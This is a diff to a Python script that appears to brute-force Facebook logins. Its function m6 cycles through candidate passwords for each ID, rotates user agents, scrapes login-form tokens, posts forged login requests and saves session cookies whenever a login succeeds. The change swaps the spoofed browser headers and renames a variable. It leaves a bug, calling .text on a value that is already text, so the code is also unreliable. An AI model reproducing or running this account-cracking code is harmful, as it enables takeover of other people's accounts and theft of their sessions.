@@ -1235,7 +1235,7 @@ def m6(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    KING=random.choice(ugen) 
-   free_fb = session.get('https://m.facebook.com').text
+   link = session.get('https://m.facebook.com').text
    info={'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
 'display': '',
@@ -1257,34 +1257,20 @@ def m6(idf,pwv):
 'had_cp_prefilled': 'true',
 'had_password_prefilled': 'true',
 'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
-'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps)}
+'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps),}
    had={
-   'Host': f'm.facebook.com',
-   'content-length': '1662',
-   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
-   'sec-ch-ua-mobile': '?1',
-   'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4361.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;',
-   'x-response-format': 'JSONStream',
-   'content-type': 'application/x-www-form-urlencoded',
-   'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   'viewport-width': '360',
-   'sec-ch-ua-platform-version': "",
-   'x-requested-with': 'XMLHttpRequest',
-   'x-asbd-id': '129477',
-   'dpr': '2',
-   'sec-ch-ua-full-version-list': '',
-   'sec-ch-ua-model': "",
-   'sec-ch-prefers-color-scheme': 'light',
-   'sec-ch-ua-platform': '"Windows"',
-   'accept': '*/*',
-   'origin': f'https://m.facebook.com',
-   'sec-fetch-site': 'same-origin',
-   'sec-fetch-mode': 'cors',
-   'sec-fetch-dest': 'empty',
-   'referer': f'https://m.facebook.com/login/?wtsid=rdr_0HpBBBchEc4DCrXrX&refsrc=deprecated&_rdr',
-   'accept-encoding': 'gzip, deflate, br',
-   'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-   lo = session.post("https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100",data=info,headers=had).text
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'DNT': '1',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Referer': 'https://www.facebook.com/',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Origin': 'https://www.facebook.com',
+    'Host': 'www.facebook.com',}
+   lo = session.post("https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100",data=info,headers=had).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([cookie for cookie in session.cookies])
